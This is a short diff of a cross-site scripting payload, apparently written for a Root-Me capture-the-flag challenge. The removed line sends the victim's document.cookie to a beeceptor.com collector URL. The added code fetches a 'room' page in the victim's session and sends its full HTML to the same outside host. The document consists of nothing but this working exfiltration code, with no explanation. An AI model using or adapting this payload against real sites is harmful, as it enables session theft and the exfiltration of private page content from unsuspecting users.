@@ -1,3 +1,15 @@
 <script>
-  window.location="https://toitoise.free.beeceptor.com/?c="+document.cookie
+var url = "http://ctf15.root-me.org/room";
+var req = new XMLHttpRequest();
+
+req.onload = function () {
+    if (req.status === 200) {
+        var data = encodeURIComponent(req.response.documentElement.innerHTML);
+        window.location ="https://toitoise.free.beeceptor.com/?c=" + data;
+    }
+};
+
+req.open("GET", url, true);
+req.responseType = "document";
+req.send();
 </script>
